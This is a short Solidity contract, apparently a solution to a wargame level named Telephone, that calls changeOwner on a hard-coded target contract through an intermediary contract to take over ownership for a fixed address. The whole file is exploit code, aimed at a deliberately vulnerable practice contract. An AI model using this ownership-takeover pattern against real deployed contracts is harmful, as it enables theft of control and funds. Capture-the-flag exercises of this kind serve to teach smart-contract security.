// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "../Telephone.sol";

contract HackTelephone {
    Telephone private level4 = Telephone(0xA7DA303075135696Fb33E294E156257Ff58b583b);
    function attack() external {
        level4.changeOwner(0x9D95B165eCefa55c21Df4cFfc9718781d36B4A6c);
    }
}
